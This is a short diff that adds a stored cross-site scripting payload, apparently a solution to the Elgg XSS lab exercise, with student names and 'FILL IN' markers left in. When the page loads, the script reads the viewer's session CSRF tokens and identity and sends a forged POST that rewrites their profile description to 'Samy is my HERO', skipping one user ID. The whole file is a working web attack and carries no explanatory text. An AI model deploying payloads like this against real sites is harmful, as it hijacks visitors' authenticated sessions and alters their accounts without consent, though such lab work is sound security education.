@@ -1,0 +1,26 @@
+<script type="text/javascript">
+
+window.onload = function() {
+
+  //Construct the HTTP POST request to modify profile.
+  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+  var token="&__elgg_token="+elgg.security.token.__elgg_token;
+  var name="&name=" + elgg.session.user.name;
+  var guid="&guid=" + elgg.session.user.guid;
+  var text="&description=Samy is my HERO(added by Jaron Ge and Jack Fredericks)" +  "&accesslevel%5Bdescription%5D=2";
+  var sendurl="http://www.xsslabelgg.com/action/profile/edit"; // FILL IN
+  var content=token + ts + name + text + guid; // FILL IN
+
+  //Modify Victim's profile except for SAMY
+  if (elgg.session.user.guid != 47) // FILL IN
+ {
+	//Create and send Ajax request to modify profile
+	var Ajax=null;
+	Ajax=new XMLHttpRequest();
+	Ajax.open("POST", sendurl, true);
+	Ajax.setRequestHeader("Host"," www.xsslabelgg.com");
+	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	Ajax.send(content);
+  }
+}
+</script>
